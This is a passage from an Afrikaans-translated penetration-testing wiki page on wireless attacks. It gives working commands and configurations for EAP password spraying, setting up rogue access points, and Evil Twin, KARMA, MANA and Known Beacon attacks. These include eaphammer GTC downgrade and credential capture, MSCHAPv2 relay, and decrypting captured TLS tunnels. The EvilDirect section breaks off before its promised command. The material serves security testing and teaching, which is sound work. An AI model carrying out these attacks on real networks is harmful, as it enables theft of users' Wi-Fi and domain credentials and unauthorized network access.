Mitigasies / waarna om te kyk
- Verifieer dat kliënte anonieme outer identities (pseudonieme) vir EAP‑SIM/AKA gebruik volgens 3GPP‑riglyne (bv. 3GPP TS 33.402).
- Gee voorkeur aan die tonnelering van die identiteitsfase (bv. EAP‑TTLS/PEAP wat inner EAP‑SIM/AKA dra) sodat die IMSI nooit in duidelike teks gestuur word nie.
- Packet captures van association/auth moet nooit ’n rou IMSI in EAP-Response/Identity openbaar nie.

Verwante: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

As van die kliënt verwag word om ’n **username and password** te gebruik (let wel: **EAP-TLS won't be valid** in hierdie geval), kan jy probeer om ’n **list** van **usernames** (sien volgende deel) en **passwords** te bekom en die toegang te **bruteforce** met [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Jy kan hierdie aanval ook met `eaphammer` uitvoer:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Kliëntaanvalle Teorie

### Netwerkkeuse en Roaming

- Die 802.11-protokol definieer hoe 'n stasie by 'n Extended Service Set (ESS) aansluit, maar spesifiseer nie die kriteria vir die keuse van 'n ESS of 'n access point (AP) daarin nie.
- Stasies kan tussen APs beweeg wat dieselfde ESSID deel, en sodoende verbinding oor 'n gebou of gebied behou.
- Die protokol vereis dat die stasie by die ESS geverifieer word, maar vereis nie dat die AP by die stasie geverifieer word nie.

### Voorkeurnetwerklyste (PNL)

- Stasies stoor die ESSID van elke draadlose netwerk waarmee hulle koppel in hul Voorkeurnetwerklys (PNL), tesame met netwerk-spesifieke konfigurasiedetaljes.
- Die PNL word gebruik om outomaties aan bekende netwerke te koppel, wat die gebruiker se ervaring verbeter deur die verbindingsproses te vereenvoudig.

### Passiewe skandering

- APs stuur periodiek beacon frames uit wat hul teenwoordigheid en kenmerke aankondig, insluitend die AP se ESSID tensy uitsending gedeaktiveer is.
- Tydens passiewe skandering luister stasies na beacon frames. As 'n beacon se ESSID ooreenstem met 'n inskrywing in die stasie se PNL, kan die stasie outomaties aan daardie AP koppel.
- Kennis van 'n toestel se PNL maak potensiële misbruik moontlik deur die ESSID van 'n bekende netwerk na te boots, en die toestel te mislei om aan 'n rogue AP te koppel.

### Aktiewe probing

- Aktiewe probing behels dat stasies probe requests stuur om na nabygeleë APs en hul kenmerke te soek.
- Directed probe requests rig op 'n spesifieke ESSID, wat help om te bepaal of 'n bepaalde netwerk binne bereik is, selfs al is dit 'n hidden network.
- Broadcast probe requests het 'n null SSID-veld en word na alle nabygeleë APs gestuur, wat die stasie toelaat om vir enige voorkeurnetwerk te kyk sonder om die inhoud van sy PNL bekend te maak.

## Eenvoudige AP met herleiding na die Internet

Voordat verduidelik word hoe om meer komplekse aanvalle uit te voer, gaan dit verduidelik word **hoe** om net **skep** 'n **AP** en **herlei** sy **verkeer** **na** die **Internet**.

Gebruik `ifconfig -a` om te kontroleer dat die wlan koppelvlak wat die AP gaan skep en die koppelvlak wat met die Internet verbind is, teenwoordig is.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Skep die konfigurasielêer `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Dan **stel IPs** en **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
En dan **begin** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Skep 'n config file `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Stop vervelende prosesse**, stel **monitor mode** in en **start hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Deurstuur en Omleiding
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

’n Evil Twin-aanval maak gebruik van die manier waarop WiFi clients netwerke herken, en vertrou hoofsaaklik op die netwerknaam (ESSID) sonder om te vereis dat die base station (access point) homself aan die client autentiseer. Sleutelpunte sluit in:

- **Moeilikheid om te onderskei**: Toestelle sukkel om te onderskei tussen legitime en rogue access points wanneer hulle dieselfde ESSID en enkripsietipe deel. Reële netwerke gebruik dikwels meerdere access points met dieselfde ESSID om dekking naatloos uit te brei.
- **Client-roaming en verbindingsmanipulasie**: Die 802.11-protokol laat devices toe om tussen access points binne dieselfde ESS te roam. Aanvallers kan dit misbruik deur ’n toestel te raaklei om van sy huidige base station los te koppel en met ’n rogue een te verbind. Dit kan bereik word deur ’n sterker sein aan te bied of die konneksie met die legitieme access point te ontwrig deur metodes soos deauthentication packets of jamming.
- **Uitvoeringsuitdagings**: Om ’n Evil Twin suksesvol uit te voer in omgewings met meerdere, goed geplaasde access points kan uitdagend wees. Deauthenticating ’n enkele legitieme access point lei dikwels daartoe dat die toestel met ’n ander legitieme access point verbind, tensy die aanvaller alle nabygeleë access points kan deauthenticate of die rogue access point strategies kan plaas.

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Jy kan ook 'n Evil Twin skep met **eaphammer** (Let wel: om evil twins met eaphammer te skep, die interface **MOET NIE** in **monitor** mode wees):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Of gebruik Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Neem asseblief kennis dat standaard, as 'n ESSID in die PNL as WPA protected gestoor is, die toestel nie outomaties aan 'n Open evil Twin sal koppel nie. Jy kan probeer om die regte AP te DoS en hoop dat die gebruiker handmatig met jou Open evil twin koppel, of jy kan die regte AP DoS en 'n WPA Evil Twin gebruik om die handshake vas te vang (met hierdie metode sal jy nie die slagoffer by jou kan laat koppel nie aangesien jy nie die PSK ken nie, maar jy kan die handshake vasvang en probeer kraak).

_Sommige OS en AV sal die gebruiker waarsku dat om met 'n Open network te koppel gevaarlik is..._

### WPA/WPA2 Evil Twin

Jy kan 'n **Evil Twin using WPA/2** skep en as die toestelle geconfigureer is om met daardie SSID via WPA/2 te koppel, sal hulle probeer koppel. Hoe ookal, **to complete the 4-way-handshake** moet jy ook **weet** die **password** wat die kliënt gaan gebruik. As jy dit **nie weet nie**, sal die **verbinding nie voltooi word nie**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Om hierdie aanvalle te verstaan, beveel ek aan om eers die kort [WPA Enterprise explanation](#wpa-enterprise-mgt) te lees.

**Gebruik hostapd-wpe**

`hostapd-wpe` benodig 'n **konfigurasie** lêer om te werk. Om die generering van hierdie konfigurasies te **outomatiseer**, kan jy [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) gebruik (laai die python-lêer binne _/etc/hostapd-wpe/_ af)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
In die konfigurasielêer kan jy 'n hele paar verskillende dinge kies, soos ssid, channel, user files, cret/key, dh parameters, wpa version en auth...

[**Gebruik hostapd-wpe met EAP-TLS om enige sertifikaat toe te laat om aan te meld.**](evil-twin-eap-tls.md)

**Gebruik EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Standaard gebruik EAPHammer die volgende authentication methods (let op GTC as die eerste om plaintext passwords te probeer verkry, en daarna die gebruik van meer robuuste auth methods):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Dit is die standaardmetodologie om lang konneksietye te vermy. Jy kan egter ook vir die server die authentication methods spesifiseer van swakste na sterkste:
```
--negotiate weakest
```
Of jy kan ook gebruik:

- `--negotiate gtc-downgrade` om die hoogs doeltreffende GTC downgrade-implementering te gebruik (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` om die metodes wat aangebied word handmatig te spesifiseer (as jy dieselfde auth-metodes in dieselfde volgorde as die organisasie aanbied, sal die aanval baie moeiliker wees om te ontdek).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### Wanneer kliënte RADIUS-sertifikaatvalidasie oorslaan (PEAP/TTLS)

- As toestelle gekonfigureer is met "do not validate certificate", sal 'n gekloneerde AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) **NetNTLMv2** (PEAP-MSCHAPv2) of **cleartext** creds (PEAP-GTC) versamel. `bettercap` deauth (`wifi.deauth <BSSID>`) openbaar terselfdertyd weggesteekte SSIDs tydens probes en dwing herverbindings af, tensy PMF/802.11w vervalste deauth blokkeer.
- Geskraakte NetNTLMv2 gee herbruikbare Wi‑Fi/AD creds; GTC lewer onmiddellike plaintext.

#### Deurstuur van PEAP-MSCHAPv2 in plaas van kraak (wpa_sycophant + hostapd-mana)

- Vir masjienrekeninge met onkraakbare ewekansige wagwoorde, misbruik **MSCHAPv2 relay**: hardloop `hostapd-mana` as die Evil Twin en stuur die MSCHAPv2-uitruiling deur na `wpa_sycophant`, wat gelyktydig met die legitieme AP verbind. 'n Suksesvolle relay gee geverifieerde Wi‑Fi sonder om die wagwoord te herstel.
- Gebruik builds wat die teiken-sekuriteitsvlak ondersteun (WPA3/PMF vereis onlangse hostapd/wpa_supplicant); PMF voorkom deauth-dwinging, dus wag vir vrywillige kliëntassosiasies.

**Using Airgeddon**

`Airgeddon` kan vooraf gegenereerde sertifikate gebruik om EAP-authentisering aan WPA/WPA2-Enterprise netwerke aan te bied. Die vals netwerk sal die konneksieprotokol terugskaal na EAP-MD5 sodat dit die **gebruiker en die MD5 van die wagwoord** kan vasvang. Later kan die aanvaller probeer om die wagwoord te kraak.\
`Airggedon` bied jou die moontlikheid van 'n **deurlopende Evil Twin attack (noisy)** of **slegs om die Evil Attack te skep totdat iemand koppel (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Binne die **konfigurasie** van _hostapd-wpe_ **kommenteer** die lyn wat _**dh_file**_ bevat (van `dh_file=/etc/hostapd-wpe/certs/dh` na `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Dit sal `hostapd-wpe` laat **sleutels uitruil met RSA** in plaas van DH, sodat jy later die verkeer kan **ontsleutel** deur **die bediener se private sleutel te ken**.

Begin nou die **Evil Twin** met **`hostapd-wpe`** en daardie gewijzigde konfigurasie soos gewoonlik. Begin ook **`wireshark`** op die **interface** wat die Evil Twin-aanval uitvoer.

Nou of later (wanneer jy reeds sommige autentiseringspogings vasgelê het) kan jy die private RSA-sleutel by wireshark voeg in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Voeg 'n nuwe inskrywing by en vul die vorm met hierdie waardes: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**kies jou sleutel-lêer**, om probleme te vermy kies 'n sleutel-lêer **sonder wagwoordbeskerming**).

![](<../../images/image (687).png>)

En kyk na die nuwe **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Verskillende soorte Media Access Control Filter Lists (MFACLs) en hul ooreenstemmende modi en die effek op die gedrag van 'n rogue Access Point (AP):

1. **MAC-based Whitelist**:
- Die rogue AP sal slegs reageer op probe-versoeke van toestelle wat in die whitelist gespesifiseer is, en bly onsigbaar vir alle ander wat nie gelys is nie.
2. **MAC-based Blacklist**:
- Die rogue AP sal probe-versoeke van toestelle op die blacklist ignoreer, wat die rogue AP effektief onsigbaar maak vir daardie spesifieke toestelle.
3. **SSID-based Whitelist**:
- Die rogue AP sal slegs op probe-versoeke reageer vir spesifieke ESSIDs wat gelys is, en sodoende onsigbaar wees vir toestelle wie se Preferred Network Lists (PNLs) daardie ESSIDs nie bevat nie.
4. **SSID-based Blacklist**:
- Die rogue AP sal nie op probe-versoeke vir die spesifieke ESSIDs op die blacklist reageer nie, en maak dit onsigbaar vir toestelle wat daardie netwerke soek.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Hierdie metode maak dit vir 'n **attacker moontlik om 'n kwaadwillige access point (AP) te skep wat op alle probe requests reageer** van devices wat probeer koppel aan netwerke. Hierdie tegniek **mislei devices om aan 'n attacker se AP te koppel** deur die netwerke wat die devices soek na te boots. Sodra 'n device 'n verbindingsversoek na hierdie rogue AP stuur, voltooi dit die verbinding, wat daartoe lei dat die device per ongeluk aan die attacker se netwerk koppel.

### MANA

Daarna het **devices begin ongevraagde netwerkantwoorde ignoreer**, wat die doeltreffendheid van die oorspronklike karma attack verminder het. 'n Nuwe metode, bekend as die **MANA attack**, is egter deur Ian de Villiers en Dominic White bekendgestel. Hierdie metode behels dat die rogue AP die **Preferred Network Lists (PNL) van devices opvang deur op hul broadcast probe requests te reageer** met netwerkname (SSIDs) wat voorheen deur die devices gestuur is. Hierdie gesofistikeerde aanval omseil die beskermings teen die oorspronklike karma attack deur die wyse waarop devices bekende netwerke onthou en prioritiseer, uit te buit.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

'n **Loud MANA attack** is 'n gevorderde strategie vir wanneer toestelle nie gerigte probeversoeke gebruik nie of wanneer hul Preferred Network Lists (PNL) vir die aanvaller onbekend is. Dit werk op die beginsel dat **toestelle in dieselfde area waarskynlik sekere netwerkname in hul PNLs deel**. In plaas daarvan om selektief te reageer, stuur hierdie aanval probe responses uit vir elke netwerknaam (ESSID) wat in die gekombineerde PNLs van alle waargenome toestelle gevind word. Hierdie breë benadering verhoog die kans dat 'n toestel 'n bekende netwerk herken en probeer koppel aan die rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Wanneer die **Loud MANA attack** moontlik nie voldoende is nie, bied die **Known Beacon attack** ’n ander benadering. Hierdie metode **brute-forces die konneksieproses deur ’n AP te simuleer wat op enige netwerknaam reageer, en deur ’n lys potensiële ESSIDs te deursoek** wat van ’n wordlist afkomstig is. Dit simuleer die teenwoordigheid van talle netwerke, in die hoop om ’n ESSID in die slagoffer se PNL te pas, wat ’n konneksiepoging tot die gemaakte AP sal uitlok. Die aanval kan versterk word deur dit met die `--loud` opsie te kombineer vir ’n meer agressiewe poging om toestelle te vang.

Eaphammer het hierdie aanval geïmplementeer as ’n MANA attack waarin al die ESSIDs in ’n lys aangebied word (jy kan dit ook met die `--loud` kombineer om ’n Loud MANA + Known beacons attack te skep):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

Die **Known Beacon Burst attack** behels **snel opeenvolgende uitsending van beacon frames vir elke ESSID wat in 'n lêer gelys is**. Dit skep 'n digte omgewing van vals netwerke, wat die waarskynlikheid dat toestelle aan die rogue AP koppel aansienlik verhoog, veral wanneer dit in kombinasie met 'n MANA attack gebruik word. Hierdie tegniek benut snelheid en hoeveelheid om toestelle se netwerkkeuse-meganismes te oorweldig.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** is 'n protokol wat toestelle in staat stel om direk met mekaar te skakel via Wi-Fi sonder die behoefte aan 'n tradisionele draadlose access point. Hierdie vermoë is geïntegreer in verskeie Internet of Things (IoT)-toestelle, soos drukkers en televisies, en fasiliteer direkte toestel-tot-toestel kommunikasie. 'n Bekende kenmerk van Wi-Fi Direct is dat een toestel die rol van 'n access point aanneem, bekend as die group owner, om die verbinding te bestuur.

Sekuriteit vir Wi-Fi Direct-verbindinge word gevestig deur **Wi-Fi Protected Setup (WPS)**, wat verskeie metodes vir veilige koppeling ondersteun, insluitend:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Hierdie metodes, veral PIN entry, is vatbaar vir dieselfde kwesbaarhede as WPS in tradisionele Wi-Fi-netwerke, wat hulle tot teikens van soortgelyke aanvalvektore maak.

### EvilDirect Hijacking

**EvilDirect Hijacking** is 'n aanval spesifiek vir Wi-Fi Direct. Dit spieël die konsep van 'n Evil Twin-aanval, maar mik na Wi-Fi Direct-verbindinge. In hierdie scenario doen 'n aanvaller voor as 'n regmatige group owner met die doel om toestelle te mislei om met 'n kwaadwillige entiteit te koppel. Hierdie metode kan uitgevoer word met gereedskap soos `airbase-ng` deur die channel, ESSID en MAC address van die geïmpersonifiseerde toestel te spesifiseer:

## Verwysings

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Kyk na [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (aanmelding met facebook en nabootsing van WPA in captive portals)

{{#include ../../banners/hacktricks-training.md}}
